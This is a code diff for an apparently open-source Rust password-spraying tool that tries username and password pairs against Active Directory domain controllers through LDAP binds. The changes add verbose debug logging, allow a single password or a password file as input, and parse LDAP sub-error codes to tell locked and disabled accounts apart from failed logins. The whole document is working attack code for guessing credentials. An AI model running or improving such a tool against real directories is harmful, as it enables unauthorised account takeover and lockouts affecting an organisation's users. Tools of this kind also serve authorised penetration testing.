@@ -1,7 +1,7 @@
-use crate::args::ProxyConfig;
 use crate::args::SprayArgs;
 use crate::help::add_terminal_spacing;
 use crate::help::print_timestamp;
+use crate::proxy::ProxyConfig;
 use chrono::Local;
 use ldap3::LdapConn;
 use std::error::Error;
@@ -91,7 +91,7 @@ pub fn start_password_spray(config: SprayConfig) -> Result<(), Box<dyn Error>> {
     println!("[*] Reachable Domain Controllers: {:?}", reachable_dcs);
 
     let users = read_users(&config.userfile)?;
-    let passwords = read_lines(&config.passwords)?;
+    let passwords = read_passwords(&config.passwords)?;
 
     println!("[*] Loaded {} users", users.len());
     println!("[*] Loaded {} passwords", passwords.len());
@@ -128,6 +128,7 @@ pub fn start_password_spray(config: SprayConfig) -> Result<(), Box<dyn Error>> {
                 user,
                 password,
                 &config.domain,
+                config.verbose,
             ) {
                 Ok(LoginResult::Success) => {
                     // Handle successful login
@@ -240,39 +241,76 @@ fn try_login(
     username: &str,
     password: &str,
     domain: &str,
+    verbose: bool, // Pass verbose flag
 ) -> Result<LoginResult, Box<dyn Error>> {
-    // Create LDAP connection
+    if verbose {
+        eprintln!(
+            "[DEBUG] Attempting LDAP bind → {} on {}",
+            username, ldap_url
+        );
+    }
+
     let mut ldap = LdapConn::new(ldap_url)?;
 
-    // Format the username with the domain (UPN format)
     let bind_dn = format!("{}@{}", username.trim(), domain);
+    let result = ldap.simple_bind(&bind_dn, password);
 
-    // Attempt a bind
-    match ldap.simple_bind(&bind_dn, password) {
-        Ok(result) => {
-            match result.success() {
-                Ok(_) => Ok(LoginResult::Success),             // Login succeeded
-                Err(_) => Ok(LoginResult::InvalidCredentials), // Bind failed with invalid credentials
+    match result {
+        Ok(ldap_result) => {
+            if verbose {
+                eprintln!("[DEBUG] LDAP bind successful. Checking for errors...");
+            }
+            match ldap_result.success() {
+                Ok(_) => Ok(LoginResult::Success),
+                Err(e) => {
+                    if verbose {
+                        eprintln!("[DEBUG] Unsuccessful bind: {:?}", e);
+                    }
+                    extract_and_match_error_code(&e, verbose)
+                }
             }
         }
         Err(e) => {
-            let error_string = e.to_string();
-
-            if error_string.contains("data 52e") {
-                // Invalid credentials
-                Ok(LoginResult::InvalidCredentials)
-            } else if error_string.contains("data 775") {
-                // Account locked out
-                Ok(LoginResult::AccountLocked)
-            } else if error_string.contains("data 533") {
-                // Account disabled
-                Ok(LoginResult::AccountDisabled)
-            } else {
-                // Other errors, e.g., connection errors
-                Err(Box::new(e))
+            if verbose {
+                eprintln!("[DEBUG] LDAP bind failed: {:?}", e);
             }
+            extract_and_match_error_code(&e, verbose)
         }
     }
+}
+
+fn extract_and_match_error_code(
+    err: &dyn std::error::Error,
+    verbose: bool,
+) -> Result<LoginResult, Box<dyn Error>> {
+    let raw_error = err.to_string();
+    if verbose {
+        eprintln!("[DEBUG] Raw error text: {}", raw_error);
+    }
+
+    if let Some(sub_error_code) = extract_sub_error_code(&raw_error) {
+        if verbose {
+            eprintln!("[DEBUG] Extracted sub-error code: {}", sub_error_code);
+        }
+        match sub_error_code.as_str() {
+            "775" => Ok(LoginResult::AccountLocked),
+            "533" => Ok(LoginResult::AccountDisabled),
+            _ => Ok(LoginResult::InvalidCredentials),
+        }
+    } else {
+        if verbose {
+            eprintln!("[DEBUG] No sub-error code found. Treating as failed login.");
+        }
+        Ok(LoginResult::InvalidCredentials)
+    }
+}
+
+fn extract_sub_error_code(raw_error: &str) -> Option<String> {
+    raw_error
+        .split("data ")
+        .nth(1)
+        .and_then(|data| data.split(',').next())
+        .map(|code| code.trim().to_string())
 }
 
 fn read_lines<P>(filename: P) -> io::Result<Vec<String>>
@@ -295,6 +333,16 @@ fn read_users(user_input: &str) -> io::Result<Vec<String>> {
     } else {
         // If not a file, treat it as a direct username
         Ok(vec![user_input.to_string()])
+    }
+}
+
+fn read_passwords(password_input: &str) -> io::Result<Vec<String>> {
+    // If the input looks like a file path, try to read it
+    if Path::new(password_input).exists() {
+        read_lines(password_input)
+    } else {
+        // If not a file, treat it as a direct username
+        Ok(vec![password_input.to_string()])
     }
 }
 
